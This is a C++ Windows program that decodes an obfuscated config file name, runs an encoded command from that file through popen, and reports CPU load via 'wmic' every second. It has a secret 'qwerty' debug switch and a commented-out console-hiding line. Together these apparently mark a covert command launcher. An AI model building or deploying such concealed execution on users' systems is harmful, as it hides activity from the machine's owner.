#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <vector>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

const int& CPUsage(void);
FILE* pipe = 0;

void CALLBACK timer ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { cout << CPUsage() << endl; }

int main (int argc, char** argv
) {
try {

static bool cons = false;
if (argc > 1) {
    string arg(argv[1]);
    if (arg == "qwerty") cons = true;
}

//if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );

static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
    name.decode();
    if (cons) cout << name << endl;
    ifstream  ini( name.c_str(), ios::in); 
    if ( !ini.is_open())
        throw runtime_error(name + ": file not open");

static hide::line arg, Args;
static vector<hide::line> Run;

while ( getline(ini, arg)) {
    if ( *(arg.begin()) == '#') {
        Args.append(" 2>&1");
        Run.push_back(Args);
        Args.clear();
        continue;
    }
    arg.decode();
    if (cons)
            cout << arg << endl;
    Args.append(arg);
}

if (cons) {
    cout << Args << endl;
    throw runtime_error("^^^ eof");
}
if ( !Run.size())
    throw runtime_error("Empty config, never mind");

pipe = ::popen( Run[0].c_str(), "r"); 
if(!pipe)
    throw runtime_error(Run[0] + ": popen fail");

::SetTimer (NULL, 0, 1000, (TIMERPROC) &timer);

static string console;
while (getline (cin, console))
{
    cout << "What?!" << endl;
}
/*
static char buff[16];
while( ::fgets( buff, sizeof(buff), pipe) !=NULL) {
    cout << buff << flush;
}
*/

return 0;
} catch (const exception& e) {
//    cerr << e.what() << endl;
if(pipe) pclose(pipe);
return 1;
}}

const int& CPUsage(void)
{
static string percent;
static char buff[16];
FILE* pipe = popen("wmic cpu get loadpercentage", "r"); 
if(!pipe)
    throw runtime_error("wmic fail");

while( fgets(buff, sizeof(buff), pipe)!=NULL) {
    percent = buff;
    if ( isdigit( *percent.begin()) ) break;
}
pclose(pipe);

static int per;
istringstream sper(percent); sper >> per;
return per;
}